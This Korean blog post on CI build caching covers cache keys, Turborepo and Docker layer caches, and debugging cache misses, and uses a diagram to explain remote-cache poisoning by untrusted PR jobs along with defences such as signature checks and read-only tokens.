+<NetworkTopology
+  caption="쓰기 권한이 넓으면 캐시가 공격 경로가 된다"
+  width={400}
+  height={300}
+  zones={[
+    { id: "trusted", label: "main 빌드", x: 10, y: 10, w: 180, h: 120, tone: "public" },
+    { id: "pr", label: "외부 PR", x: 10, y: 160, w: 180, h: 130, tone: "edge" },
+  ]}
+  nodes={[
+    { id: "main", label: "main CI", sub: "서명 키 있음", x: 100, y: 70, icon: "server" },
+    { id: "evil", label: "fork PR", sub: "쓰기 토큰?", x: 100, y: 225, icon: "client" },
+    { id: "rc", label: "remote cache", sub: "1b55c470…", x: 300, y: 150, icon: "db", w: 120 },
+    { id: "dep", label: "deploy", sub: "운영 번들", x: 300, y: 250, icon: "lock" },
+  ]}
+  links={[
+    { from: "main", to: "rc" },
+    { from: "evil", to: "rc", dashed: true },
+    { from: "rc", to: "dep" },
+  ]}
+  steps={[
+    { path: ["main", "rc"], packet: "PUT+sig", title: "정상 결과물", detail: "main 빌드가 결과물과 서명을 올린다." },
+    { path: ["evil", "rc"], packet: "PUT", highlight: ["pr"], title: "같은 해시로 덮어쓴다", detail: "PR 잡이 쓰기 토큰을 갖고 있으면 같은 해시 이름으로 변조한 파일을 올릴 수 있다. 서버는 내용을 검사하지 않는다." },
+    { path: ["rc", "dep"], packet: "evil.js", title: "서명이 없으면 그대로 나간다", detail: "운영 배포 빌드가 캐시 적중으로 변조된 번들을 받는다. 소스 리뷰로는 찾을 수 없다." },
+    { path: ["rc", "dep"], packet: "evil.js", blocked: true, title: "서명을 검증하면 막힌다", detail: "서명 키는 main 빌드만 갖는다. 맞지 않는 결과물은 버리고 직접 빌드한다." },
+  ]}
+/>
+
+서명 말고도 지킬 규칙이 있다. 신뢰하지 않는 코드(외부 기여자의 PR)를 돌리는 잡에는 원격 캐시 쓰기 권한을 주지 않는다. 읽기만 허용해도 속도 이득은 대부분 얻는다. GitHub Actions 캐시에도 같은 문제가 있다. 브랜치 범위 덕분에 PR이 만든 캐시는 main이 읽지 못하지만, `pull_request_target`처럼 기본 브랜치 맥락에서 도는 워크플로가 PR의 코드를 실행하면 그 캐시는 기본 브랜치 범위에 저장된다. 그러면 모든 브랜치와 릴리스 워크플로가 그걸 받는다. 그래서 운영에 나갈 결과물을 만드는 릴리스 워크플로는 캐시를 아예 복원하지 않고 처음부터 빌드하는 팀도 많다. 느리지만 릴리스는 하루 몇 번뿐이다.
+
+## Docker 빌드의 캐시는 어디에 두나
+
+Docker 이미지 빌드도 CI에서는 같은 문제를 겪는다. 레이어 캐시는 BuildKit 안에 있는데 러너가 사라지면 같이 사라진다. 그래서 `--cache-to`로 캐시를 밖에 내보내고 `--cache-from`으로 가져온다. 둘 곳은 레지스트리(`type=registry`), GitHub Actions 캐시(`type=gha`), 로컬 디렉터리(`type=local`) 등이 있다. 원리와 설정은 [앞 글](/posts/github-actions-docker-ecr)에서 다뤘다.
+
+헷갈리는 부분이 하나 있다. Dockerfile의 `RUN --mount=type=cache,target=/root/.local/share/pnpm/store` 같은 캐시 마운트는 레이어가 아니라서 `--cache-to`로 내보내지지 않는다. 내 노트북에서는 잘 먹던 캐시 마운트가 매번 새 러너에서는 매번 비어 있는 이유다. CI에서는 의존성 설치 레이어가 lockfile만 복사한 뒤 실행되도록 순서를 잡아(그래야 레이어 캐시로 적중한다) 레이어 캐시에 기대는 편이 확실하다. 캐시 마운트를 꼭 살리고 싶으면 그 디렉터리를 Actions 캐시로 옮겨 주는 별도 단계를 둬야 한다.
+
+## 캐시가 이상할 때 보는 순서
+
+빌드가 느려졌다면 먼저 적중했는지부터 본다. `actions/cache`의 `cache-hit` 출력, Turbo의 `Cached: n cached, m total`, Docker 빌드 로그의 `CACHED` 표시가 그 지표다. 빗나갔다면 키가 왜 바뀌었는지 찾는다. Turbo는 `--dry`나 `--summarize`로 해시 입력을 보고, 두 실행의 출력을 나란히 비교하면 무엇이 달라졌는지 나온다. 흔한 원인은 lockfile이 커밋마다 바뀌는 경우(누군가 다른 pnpm 버전으로 설치), 키에 시각이나 실행 번호가 들어간 경우, 용량 한도로 밀려난 경우다.
+
+적중했는데 결과가 틀리다면 더 급하다. 해시에 빠진 입력이 있다는 뜻이다. 환경 변수, 저장소 밖 파일, 도구 버전 중 무엇이 결과물에 들어가는지 찾아 선언한다. 일단 급한 불은 캐시를 끄고(`--force`, 키 접두사 바꾸기) 빌드해서 끈다. 그리고 캐시 결과와 캐시 없이 만든 결과의 해시를 비교하는 검사를 주기적으로 돌리면 이런 문제를 사고 전에 찾을 수 있다.
+
+캐시가 계속 커진다면 부분 적중이 옛 파일을 끌고 다니는 것이다. 복원에 걸리는 시간을 재서 설치 시간보다 길면 정리한다.
+
+## 같은 입력이면 같은 결과라는 약속
+
+빌드 캐시는 "같은 입력이면 같은 결과"라는 약속 위에서만 안전하다. 캐시 키는 그 입력을 적은 목록이고, 목록에서 빠진 입력은 언젠가 틀린 적중으로 돌아온다. 의존성은 lockfile 해시로 패키지 매니저의 저장소를 캐시하고, 작업 결과는 선언한 입력으로 해시를 내고, 원격 캐시는 쓰기 권한을 좁히고 서명을 검증한다. 캐시로 줄인 시간이 배포 흐름 전체에서 어디에 놓이는지는 [CI/CD의 뼈대](/posts/ci-cd-basics)에서 다뤘다.
+
+## 면접에서 나올 만한 질문
+
+### CI에서 의존성 캐시 키를 어떻게 정하나요?
+
+결과물에 영향을 주는 것만 넣는다. 보통 캐시 종류 접두사, OS(필요하면 아키텍처와 런타임 메이저 버전), lockfile의 해시다. 날짜나 실행 번호를 넣으면 매번 빗나가고, `package.json`만 해시하면 같은 범위 안의 버전 변경을 놓친다. 정확한 키가 없을 때를 위해 접두사만 담은 `restore-keys`를 둔다.
+
+### node_modules를 캐시하지 않고 패키지 매니저 저장소를 캐시하는 이유는요?
+
+`node_modules`에는 Node 버전과 OS에 묶인 네이티브 빌드 결과와 설치 스크립트가 만든 파일이 섞여 있어서 환경이 조금만 달라도 깨진다. `npm ci`는 시작할 때 `node_modules`를 지우기도 한다. pnpm store나 `~/.npm`은 내용 해시로 저장된 패키지 원본이라 안전하게 재사용되고, 실습에서도 store만 있으면 설치가 2초 안팎으로 안정됐다.
+
+### actions/cache에서 restore-keys로 찾은 캐시는 어떻게 다뤄지나요?
+
+부분 적중이라 `cache-hit`이 `false`가 되고, 잡이 끝날 때 primary key로 새로 저장한다. 접두사로 여러 개가 맞으면 가장 최근 것을 받는다. 반복되면 옛 패키지가 계속 쌓여 캐시가 불어나므로 가끔 store를 정리하거나 키 버전을 올린다.
+
+### 기능 브랜치에서 만든 캐시를 main에서 쓸 수 있나요?
+
+없다. 캐시는 만든 브랜치 범위에 묶이고, 브랜치는 자기 캐시와 기본 브랜치의 캐시만 읽는다. 그래서 main에서 정기적으로 캐시를 만들어 두지 않으면 PR마다 빈손으로 시작한다. 반대로 기본 브랜치 맥락에서 신뢰하지 않는 코드를 돌리면 오염된 캐시가 모든 브랜치로 퍼질 수 있다.
+
+### Turborepo 같은 작업 캐시에서 "틀린 적중"은 왜 생기나요?
+
+결과물에 영향을 주는 입력이 해시에 빠져 있을 때다. 실습에서 `API_URL`을 선언하지 않고 loose 모드로 빌드하자 스테이징 빌드가 운영 주소가 박힌 결과물을 캐시에서 받아 왔다. 환경 변수는 `env`에 선언하고, 저장소 밖 파일이나 현재 시각처럼 해시가 모르는 입력은 빌드에서 없애거나 명시적인 입력으로 바꾼다.
+
+### 원격 캐시의 보안 위험과 대책은 무엇인가요?
+
+해시는 이름표일 뿐이라, 쓰기 권한이 있으면 같은 해시로 변조한 결과물을 올려 모두에게 퍼뜨릴 수 있다. 신뢰하지 않는 PR 잡에는 읽기만 허용하고, 결과물에 HMAC 서명을 달아 받을 때 검증한다. 실습에서도 서명을 켜자 변조된 결과물은 버려지고 직접 빌드했다. 운영 릴리스 빌드는 캐시를 쓰지 않는 선택도 있다.
+
+### Dockerfile의 캐시 마운트가 CI에서는 효과가 없는 이유는요?
+
+캐시 마운트는 레이어가 아니라 BuildKit이 따로 관리하는 디렉터리라 `--cache-to`로 내보내지지 않는다. 매번 새 러너에서 빌드하면 비어 있다. CI에서는 lockfile만 먼저 복사해 설치하는 레이어 순서로 레이어 캐시에 기대거나, 캐시 마운트 디렉터리를 Actions 캐시로 옮기는 단계를 따로 둔다.
+
+### 캐시를 붙였는데 오히려 느려졌다면 무엇을 보나요?
+
+복원 시간과 원래 작업 시간을 나란히 잰다. 실습에서도 24MB를 푸는 데 4.5초 남짓 걸려 처음부터 설치하는 시간(4.4초)과 비슷했다. 의존성이 작고 레지스트리가 빠르면 캐시 이득이 거의 없고, 부분 적중이 쌓여 캐시가 커졌으면 복원이 더 길어진다. 적중률, 캐시 크기, 복원 시간을 같이 본다.
